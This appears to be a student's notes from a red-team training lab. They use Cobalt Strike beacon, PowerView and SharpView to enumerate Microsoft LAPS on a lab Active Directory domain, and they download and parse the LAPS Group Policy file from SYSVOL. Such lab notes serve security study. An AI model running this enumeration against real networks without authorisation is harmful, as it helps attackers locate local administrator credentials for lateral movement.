Organisations often have a build process for physical and virtual machines within their environment.  It's common that everything is built from the same "gold image" to ensure consistency and compliance.  However, these processes can result in every machine having the same password on accounts such as the local administrator.  If one machine and therefore the local administrator password hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account.  It ensures that the password for each account is different, random, and automatically changed on a defined schedule.  Permission to request and reset the credentials can be delegated, which are also auditable.  Here is a quick summary of how LAPS works:

1. The Active Directory schema is extended and adds two new properties to computer objects, called _ms-Mcs-AdmPwd_ and _ms-Mcs-AdmPwdExpirationTime_.
2. By default, the DACL on ms-Mcs-AdmPwd only grants read access to Domain Admins.  Each computer object is given permission to update these properties on itself.
3. Rights to read AdmPwd can be delegated to other principals (users, groups etc), which is typically done at the OU level.
4. A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs).
5. The LAPS client is also installed on every machine (commonly distributed via GPO or a third-party software management solution).
6. When a machine performs a gpupdate, it will check the AdmPwdExpirationTime property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on the LAPS policy) and sets it on the ms-Mcs-AdmPwd property.

on `WKSTN-2` as `DEV\bfarmer`
There are a few methods to hunt for the presence of LAPS.  If it's applied to a machine that you have access to, AdmPwd.dll will be on disk.
```powershell
beacon> run hostname
wkstn-2

beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 179kb    fil     05/05/2021 07:04:14   AdmPwd.dll
```
importing `powerview.ps1`
```powershell
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
recommended way to search for the `LAPS` GPO didn't work. just utilized sharview command instead
```powershell
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```
GPO didn't work. just utilized sharview command instead, had to sift through the results
```powershell
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-DomainGPO
[*] Tasked beacon to run .NET program: SharpView.exe Get-DomainGPO
[+] host called home, sent: 879894 bytes
[+] received output:
objectguid                     : bbe274cc-6fcc-4e17-8804-bdc0ae952515
name                           : {2BE4337D-D231-4D23-A029-7B999885E659}
distinguishedname              : CN={2BE4337D-D231-4D23-A029-7B999885E659},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
whencreated                    : 8/16/2022 12:20:45 PM
whenchanged                    : 9/14/2022 9:48:59 AM
cn                             : {{2BE4337D-D231-4D23-A029-7B999885E659}}
objectclass                    : {top, container, groupPolicyContainer}
displayname                    : LAPS
gpcfunctionalityversion        : 2
usnchanged                     : 123238
showinadvancedviewonly         : True
gpcmachineextensionnames       : [{00000000-0000-0000-0000-000000000000}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{B087BE9D-ED37-454F-AF9C-04291E351182}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}][{C6DC5466-785A-11D2-84D0-00C04FB169F7}{942A8E4F-A261-11D1-A760-00C04FB9603F}][{D76B9641-3288-4F75-942D-087DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
instancetype                   : 4
versionnumber                  : 25
usncreated                     : 25966
flags                          : 1
objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=cyberbotic,DC=io
gpcfilesyspath                 : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}
dscorepropagationdata          : {9/7/2022 1:05:58 PM, 1/1/1601 12:00:00 AM}
```
As well as computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property).
```powershell
beacon> powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
[*] Tasked beacon to run: Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:


[01/03 20:23:16] [+] received output:
dnshostname              
-----------              
wkstn-2.dev.cyberbotic.io
web.dev.cyberbotic.io    
sql-2.dev.cyberbotic.io  
wkstn-1.dev.cyberbotic.io

```
If we locate the correct GPO, we can download the LAPS configuration from the gpcfilesyspath.
```powershell
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 12:39:19   Applications
          dir     09/13/2022 15:38:58   Microsoft
          dir     08/16/2022 12:23:37   Preferences
          dir     08/16/2022 12:21:04   Scripts
 575b     fil     08/16/2022 12:22:23   comment.cmtx
 920b     fil     08/16/2022 12:22:23   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol (920 bytes)
[*] download of Registry.pol is complete
```
The `Parse-PolFile` cmdlet from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.
- Didn't download this cmdlet, just took from course
```powershell
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 30

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : LapsAdmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PwdExpirationProtectionEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 0
```